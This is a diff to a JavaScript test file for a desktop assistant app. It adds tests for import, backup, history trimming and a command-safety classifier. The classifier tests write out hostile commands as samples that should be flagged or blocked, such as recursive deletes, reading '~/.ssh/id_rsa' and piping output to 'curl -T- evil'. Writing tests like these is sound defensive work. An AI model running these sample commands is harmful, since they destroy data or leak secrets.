@@ -42,7 +42,7 @@ function check(label, cond, extra = '') {
 // ═══════════════════════════════════════════════════════════════
 // TEST 1: MemoryStore — basic CRUD + dedup + scope
 // ═══════════════════════════════════════════════════════════════
-console.log('\n[1/8] MemoryStore — basic CRUD + scope')
+console.log('\n[1/13] MemoryStore — basic CRUD + scope')
 {
   const storage = new FakeStorage()
   const store = new MemoryStore({ storage })
@@ -78,7 +78,7 @@ console.log('\n[1/8] MemoryStore — basic CRUD + scope')
 // ═══════════════════════════════════════════════════════════════
 // TEST 2: MemoryStore — visiblePool scope filter
 // ═══════════════════════════════════════════════════════════════
-console.log('\n[2/8] MemoryStore — scope filtering')
+console.log('\n[2/13] MemoryStore — scope filtering')
 {
   const store = new MemoryStore({ storage: new FakeStorage() })
   store.add('global fact', null, { scope: 'global' })
@@ -120,7 +120,7 @@ console.log('\n[2/8] MemoryStore — scope filtering')
 // ═══════════════════════════════════════════════════════════════
 // TEST 3: ProfileStore — store + grouping + system block
 // ═══════════════════════════════════════════════════════════════
-console.log('\n[3/8] ProfileStore — CRUD + grouping + system block')
+console.log('\n[3/13] ProfileStore — CRUD + grouping + system block')
 {
   const storage = new FakeStorage()
   const profile = new ProfileStore({ storage })
@@ -164,7 +164,7 @@ console.log('\n[3/8] ProfileStore — CRUD + grouping + system block')
 // ═══════════════════════════════════════════════════════════════
 // TEST 4: MemoryExtract — regex + candidates
 // ═══════════════════════════════════════════════════════════════
-console.log('\n[4/8] MemoryExtract — patterns + candidates')
+console.log('\n[4/13] MemoryExtract — patterns + candidates')
 {
   const cases = [
     { text: 'My name is Ahmed', expect: 'Name: Ahmed', cat: 'identity', promotes: true },
@@ -199,7 +199,7 @@ console.log('\n[4/8] MemoryExtract — patterns + candidates')
 // ═══════════════════════════════════════════════════════════════
 // TEST 5: MemoryEmbeddings — cosine + backfill
 // ═══════════════════════════════════════════════════════════════
-console.log('\n[5/8] MemoryEmbeddings — cosine + backfill loop')
+console.log('\n[5/13] MemoryEmbeddings — cosine + backfill loop')
 {
   const store = new MemoryStore({ storage: new FakeStorage() })
   const emb = new MemoryEmbeddings({ store, api: mockApi })
@@ -227,7 +227,7 @@ console.log('\n[5/8] MemoryEmbeddings — cosine + backfill loop')
 // ═══════════════════════════════════════════════════════════════
 // TEST 6: MemoryRecall — scoring + profile injection
 // ═══════════════════════════════════════════════════════════════
-console.log('\n[6/8] MemoryRecall — scoring + injection')
+console.log('\n[6/13] MemoryRecall — scoring + injection')
 {
   const store = new MemoryStore({ storage: new FakeStorage() })
   const emb = new MemoryEmbeddings({ store, api: mockApi })
@@ -276,7 +276,7 @@ console.log('\n[6/8] MemoryRecall — scoring + injection')
 // (CJS module; loaded with LABAIK_HOME pointed at a temp dir so the
 // test never touches ~/.labaik.)
 // ═══════════════════════════════════════════════════════════════
-console.log('\n[7/8] folder-skills — discovery + frontmatter + guards')
+console.log('\n[7/13] folder-skills — discovery + frontmatter + guards')
 {
   const { createRequire } = await import('node:module')
   const fs = await import('node:fs')
@@ -311,11 +311,23 @@ console.log('\n[7/8] folder-skills — discovery + frontmatter + guards')
   check('get() rejects path traversal', folderSkills.get('../outside') === null)
   check('get() unknown slug → null', folderSkills.get('nope') === null)
 
+  // Starter skills (v0.8 general-use)
+  const first = folderSkills.installStarters()
+  check('installStarters installs all bundled skills',
+    first.installed.length === folderSkills.STARTER_SKILLS.length && first.skipped.length === 0)
+  check('starter skill discoverable with parsed frontmatter',
+    folderSkills.get('meeting-notes')?.description.includes('action items'))
+  // Idempotency: user edits must survive a re-install.
+  fs.writeFileSync(path.join(testHome, 'skills', 'trip-planner', 'SKILL.md'), '---\nname: Mine\n---\nedited')
+  const second = folderSkills.installStarters()
+  check('re-install skips everything (idempotent)', second.installed.length === 0)
+  check('user-edited starter not overwritten', folderSkills.get('trip-planner')?.name === 'Mine')
+
   const { meta, body } = folderSkills._parseFrontmatter('---\nName: "Quoted"\n---\nbody')
   check('frontmatter keys lowercase + quotes stripped', meta.name === 'Quoted' && body === 'body')
 
   // ═══ TEST 8: routines — cron parse + legacy shape ═══
-  console.log('\n[8/8] routines — cron parsing + legacy skills.json shape')
+  console.log('\n[8/13] routines — cron parsing + legacy skills.json shape')
   const routines = require('../electron/routines.js')
   check('parses standard cron', routines._parseCron('0 8 * * *') !== null)
   check('rejects 4-field cron', routines._parseCron('0 8 * *') === null)
@@ -330,6 +342,168 @@ console.log('\n[7/8] folder-skills — discovery + frontmatter + guards')
   const onDisk = JSON.parse(fs.readFileSync(path.join(testHome, 'routines.json'), 'utf8'))
   check('save writes routines key (not skills)', Array.isArray(onDisk.routines) && onDisk.routines.length === 2 && !onDisk.skills)
   check('new ids use rt_ prefix', onDisk.routines[1].id.startsWith('rt_'))
+
+  // ═══ TEST 9: ChatGPT import converter ═══
+  console.log('\n[9/13] import-chatgpt — mapping linearization')
+  const { convertChatGPTExport, fingerprint } = require('../electron/import-chatgpt.js')
+  const mkExport = () => ([{
+    title: 'Test conv', create_time: 1700000000, current_node: 'n3',
+    mapping: {
+      n0: { id: 'n0', parent: null, children: ['n1'], message: { author: { role: 'system' }, content: { parts: ['sys'] } } },
+      n1: { id: 'n1', parent: 'n0', children: ['n2'], message: { author: { role: 'user' }, content: { parts: ['hello'] }, create_time: 1700000001 } },
+      n2: { id: 'n2', parent: 'n1', children: ['n3'], message: { author: { role: 'assistant' }, content: { parts: ['hi there'] }, create_time: 1700000002 } },
+      n3: { id: 'n3', parent: 'n2', children: [], message: { author: { role: 'user' }, content: { parts: ['bye'] } } },
+    },
+  }, { title: 'Empty', current_node: 'x', mapping: {} }])
+  const conv = convertChatGPTExport(mkExport())
+  check('converts the active thread in order',
+    conv.ok && conv.sessions.length === 1 &&
+    conv.sessions[0].messages.map(m => m.content).join('|') === 'hello|hi there|bye')
+  check('system messages dropped', !conv.sessions[0].messages.some(m => m.role !== 'user' && m.role !== 'assistant'))
+  check('empty conversation skipped, counted', conv.skipped === 1)
+  check('wrapped {conversations:[...]} accepted', convertChatGPTExport({ conversations: mkExport() }).ok)
+  check('garbage input rejected gracefully', convertChatGPTExport({ nope: 1 }).ok === false)
+  // Cycle 39: dedup fingerprints. Same export → identical fps (stable);
+  // different content → different fp; converter stamps fp on each session.
+  check('converter stamps a fingerprint', typeof conv.sessions[0].fp === 'string' && conv.sessions[0].fp.length > 0)
+  check('re-converting the same export yields identical fingerprints',
+    convertChatGPTExport(mkExport()).sessions[0].fp === conv.sessions[0].fp)
+  check('different conversation → different fingerprint',
+    fingerprint({ title: 'A', messages: [{ role: 'user', content: 'x' }] }) !==
+    fingerprint({ title: 'B', messages: [{ role: 'user', content: 'x' }] }))
+  check('fingerprint reflects message count',
+    fingerprint({ title: 'A', messages: [{ role: 'user', content: 'x' }] }) !==
+    fingerprint({ title: 'A', messages: [{ role: 'user', content: 'x' }, { role: 'assistant', content: 'y' }] }))
+
+  // ═══ TEST 10: backup round-trip ═══
+  console.log('\n[10/13] backup — export/import round-trip, keys excluded')
+  const backup = require('../electron/backup.js')
+  fs.writeFileSync(path.join(testHome, 'sessions.json'), JSON.stringify({ v: 1, sessions: [{ id: 1, title: 'keep me' }] }))
+  fs.writeFileSync(path.join(testHome, 'credentials.json'), JSON.stringify({ secret: 'sk-DO-NOT-EXPORT' }))
+  const bundle = backup.exportBundle({ snippets: ['x'] })
+  check('bundle carries sessions', bundle.files['sessions.json']?.sessions?.[0]?.title === 'keep me')
+  check('bundle carries skills', bundle.skills.some(sk => sk.slug === 'pr-polish'))
+  check('credentials NEVER exported', !JSON.stringify(bundle).includes('sk-DO-NOT-EXPORT'))
+  check('renderer extras ride along', bundle.renderer?.snippets?.[0] === 'x')
+  // Mutate, then restore
+  fs.writeFileSync(path.join(testHome, 'sessions.json'), JSON.stringify({ v: 1, sessions: [] }))
+  const imp = backup.importBundle(bundle)
+  check('import restores sessions', imp.ok && JSON.parse(fs.readFileSync(path.join(testHome, 'sessions.json'), 'utf8')).sessions[0].title === 'keep me')
+  check('overwritten file backed up first', fs.readdirSync(testHome).some(f => f.startsWith('sessions.json.pre-import-')))
+  check('garbage bundle rejected', backup.importBundle({ nope: 1 }).ok === false)
+  check('future-version bundle rejected', backup.importBundle({ kind: 'labaik-backup', version: 99 }).ok === false)
+
+  // Cycle 29: non-destructive merge. Local has a session the bundle lacks +
+  // an older copy of a shared one; restore must keep the local-only session
+  // and take the bundle's more-complete copy of the shared one.
+  fs.writeFileSync(path.join(testHome, 'sessions.json'), JSON.stringify({ v: 1, sessions: [
+    { id: 1, title: 'keep me', messages: [{ role: 'user', content: 'a' }] },
+    { id: 2, title: 'local only', messages: [{ role: 'user', content: 'mine' }] },
+  ] }))
+  const mergeBundle = { kind: 'labaik-backup', version: 1, files: { 'sessions.json': { v: 1, sessions: [
+    { id: 1, title: 'keep me', messages: [{ role: 'user', content: 'a' }, { role: 'assistant', content: 'b' }] },
+    { id: 3, title: 'from backup', messages: [{ role: 'user', content: 'c' }] },
+  ] } }, skills: [] }
+  const merged = backup.importBundle(mergeBundle)
+  const after = JSON.parse(fs.readFileSync(path.join(testHome, 'sessions.json'), 'utf8')).sessions
+  check('merge keeps local-only session', after.some(s => s.id === 2 && s.title === 'local only'))
+  check('merge adds backup-only session', after.some(s => s.id === 3))
+  check('merge takes the more-complete shared copy', after.find(s => s.id === 1)?.messages.length === 2)
+  check('merge reports new session count', merged.mergedSessions === 1)
+
+  // ═══ TEST 11: conversation history budget ═══
+  console.log('\n[11/13] history-budget — cap, keep-recent, trim note')
+  const { capHistory } = await import('../renderer/js/history-budget.js')
+  const mk = (n, len) => Array.from({ length: n }, (_, i) => ({ role: i % 2 ? 'assistant' : 'user', content: 'x'.repeat(len) }))
+  // Under budget → unchanged (new array)
+  const small = mk(6, 100)
+  const r1 = capHistory(small, 240000)
+  check('under-budget history passes through unchanged', r1.length === 6 && r1 !== small && r1[0].content === small[0].content)
+  // ≤ minKeep always passes
+  check('<=minKeep history never trimmed', capHistory(mk(3, 999999), 10).length === 3)
+  // Over budget → trims oldest, prepends note, keeps newest
+  const big = mk(50, 10000)  // 500k chars
+  big[49].content = 'NEWEST'
+  const r2 = capHistory(big, 100000, 4)
+  check('over-budget history is trimmed', r2.length < 50)
+  check('trim keeps the newest message', r2[r2.length - 1].content === 'NEWEST')
+  check('trim prepends a note', r2[0].role === 'user' && r2[0].content.includes('trimmed'))
+  check('note reports a plausible dropped count', /\d+ earlier message/.test(r2[0].content))
+  // Always keeps at least minKeep even if each is oversize
+  check('keeps >= minKeep huge messages', capHistory(mk(10, 500000), 100000, 4).filter(m => m.content.length === 500000).length >= 4)
+  // Never mutates input
+  check('input array not mutated', big.length === 50)
+
+  // ═══ TEST 12: MCP tool-name parser ═══
+  console.log('\n[12/13] mcp — tool-name parsing')
+  const { parseMcpToolName } = require('../electron/mcp.js')
+  const eq = (a, b) => JSON.stringify(a) === JSON.stringify(b)
+  check('parses simple name', eq(parseMcpToolName('mcp_fs__read_file'), { serverName: 'fs', toolName: 'read_file' }))
+  check('server name with underscore', eq(parseMcpToolName('mcp_my_server__do_thing'), { serverName: 'my_server', toolName: 'do_thing' }))
+  check('tool name with double underscore (splits on first __)', eq(parseMcpToolName('mcp_gh__list__repos'), { serverName: 'gh', toolName: 'list__repos' }))
+  check('rejects non-mcp prefix', parseMcpToolName('notmcp_x__y') === null)
+  check('rejects empty server', parseMcpToolName('mcp___y') === null)
+  check('rejects empty tool', parseMcpToolName('mcp_fs__') === null)
+  check('rejects non-string', parseMcpToolName(null) === null)
+
+  // ═══ TEST 13: permissions — rm -rf detection across flag spellings ═══
+  console.log('\n[13/13] permissions — dangerous rm detection')
+  const perms = require('../electron/permissions.js')
+  const rmClass = (c) => perms.classifyCommand(c).class
+  check('rm -rf flagged', rmClass('rm -rf /tmp/x') === 'dangerous')
+  check('rm -r -f (split) flagged', rmClass('rm -r -f ./build') === 'dangerous')
+  check('rm --recursive --force flagged', rmClass('rm --recursive --force .') === 'dangerous')
+  check('rm -f -r (reordered) flagged', rmClass('rm -f -r data') === 'dangerous')
+  check('rm -fr (combined alt) flagged', rmClass('rm -fr x') === 'dangerous')
+  check('chained rm -r -f flagged', rmClass('echo hi && rm -r -f ./node_modules') === 'dangerous')
+  check('rm with force only NOT flagged', rmClass('rm --force ./file') !== 'dangerous')
+  check('rm recursive only NOT flagged', rmClass('rm -r ./dir') !== 'dangerous')
+  check('rm of a single file NOT flagged', rmClass('rm file.txt') !== 'dangerous')
+  check('word containing rm NOT flagged', rmClass('confirm-rm script') !== 'dangerous')
+  check('isDangerousRm exported + works', perms.isDangerousRm('rm -r -f x') === true && perms.isDangerousRm('ls') === false)
+
+  // ═══ command-scope guard (cycle 46) ═══
+  const { checkCommandScope } = require('../electron/command-scope.js')
+  const home2 = os.homedir()
+  const ws = home2 + '/proj'
+  const blocked = (c) => checkCommandScope(c, ws).ok === false
+  check('cd .. escape blocked', blocked('cd ../etc'))
+  check('cd / blocked', blocked('cd /'))
+  check('cd ~ escape blocked', blocked('cd ~ && cat secret'))
+  check('cd $HOME escape blocked', blocked('cd $HOME/.ssh'))
+  check('pushd .. blocked', blocked('pushd ..'))
+  check('reading ~/.ssh blocked', blocked('cat ~/.ssh/id_rsa'))
+  check('bare cd (→home) blocked', blocked('cd'))
+  check('in-scope ~/proj path allowed', checkCommandScope('cat ~/proj/notes.txt', ws).ok === true)
+  check('system dir /tmp allowed', checkCommandScope('cat /tmp/x', ws).ok === true)
+  check('relative cd allowed', checkCommandScope('cd subdir && ls', ws).ok === true)
+  check('plain command allowed', checkCommandScope('npm run build', ws).ok === true)
+
+  // ═══ ollama installer URL trust (cycle 47) ═══
+  const { isTrustedOllamaUrl } = require('../electron/ollama.js')
+  check('github.com release URL trusted', isTrustedOllamaUrl('https://github.com/ollama/ollama/releases/latest/download/Ollama-darwin.zip'))
+  check('githubusercontent redirect trusted', isTrustedOllamaUrl('https://objects.githubusercontent.com/abc'))
+  check('http (non-TLS) rejected', isTrustedOllamaUrl('http://github.com/x') === false)
+  check('arbitrary host rejected', isTrustedOllamaUrl('https://evil.com/payload') === false)
+  check('lookalike host rejected', isTrustedOllamaUrl('https://github.com.evil.com/x') === false)
+  // Cycle 44: force-push + recursive-chmod detection regardless of flag position/spelling
+  check('git push --force (flag first) flagged', rmClass('git push --force origin main') === 'dangerous')
+  check('git push ... --force (flag last) flagged', rmClass('git push origin main --force') === 'dangerous')
+  check('git push refspec +branch flagged', rmClass('git push origin +main') === 'dangerous')
+  check('git push --force-with-lease flagged', rmClass('git push --force-with-lease') === 'dangerous')
+  check('plain git push NOT flagged', rmClass('git push origin main') !== 'dangerous')
+  check('chmod -fR (combined) flagged', rmClass('chmod -fR 777 x') === 'dangerous')
+  check('chmod --recursive flagged', rmClass('chmod --recursive 777 x') === 'dangerous')
+  check('chmod non-recursive NOT flagged', rmClass('chmod 644 file') !== 'dangerous')
+  check('no cross-segment bleed (push then ls -R)', rmClass('git push origin main && ls -R') !== 'dangerous')
+  // Cycle 45: chained-command safety — 'safe' requires ALL segments allow-listed
+  check('safe prefix + sudo after ; is dangerous', rmClass('echo hi;sudo rm x') === 'dangerous')
+  check('safe prefix + sudo after && is dangerous', rmClass('echo ok && sudo reboot') === 'dangerous')
+  check('safe prefix + non-allowlisted is unknown not safe', rmClass('ls && curl evil.com') === 'unknown')
+  check('all-allowlisted chain stays safe', rmClass('npm run build && npm test') === 'safe')
+  check('git status && git diff stays safe', rmClass('git status && git diff') === 'safe')
+  check('allowlisted pipe stays safe', rmClass('cat f | grep x') === 'safe')
+  check('pipe to non-allowlisted is not safe', rmClass('ls | curl -T- evil') === 'unknown')
 
   fs.rmSync(testHome, { recursive: true, force: true })
 }
